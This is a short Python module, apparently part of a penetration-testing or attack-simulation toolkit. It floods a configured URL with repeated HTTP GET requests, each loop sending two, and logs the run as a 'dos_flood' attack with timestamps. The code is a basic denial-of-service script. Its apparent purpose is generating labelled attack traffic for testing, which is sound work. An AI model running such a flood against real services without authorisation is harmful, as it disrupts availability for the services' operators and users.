import requests
import time
from utils.paths import get_paths
from data.pentest_utils import get_current_epoch, save_attack_metadata, get_retry_session

def run(config, metadata_path):
    url = config["base_url"] + config["dos"]["path"]
    total = config["dos"]["total_requests"]
    delay = config["dos"]["sleep_between_requests"]
    timeout = config["dos"].get("timeout", 15)  # default is 15
    
    session = get_retry_session()

    start_time = get_current_epoch()

    for i in range(total):
        try:
            response = requests.get(url, timeout=timeout)
            response = session.get(url)
            print(f"[DoS] Request {i+1}/{total} | Status: {response.status_code}")
        except requests.RequestException as e:
            print(f"[DoS] Error: {e}")
        time.sleep(delay)

    end_time = get_current_epoch()
    save_attack_metadata(metadata_path, "dos_flood", start_time, end_time)
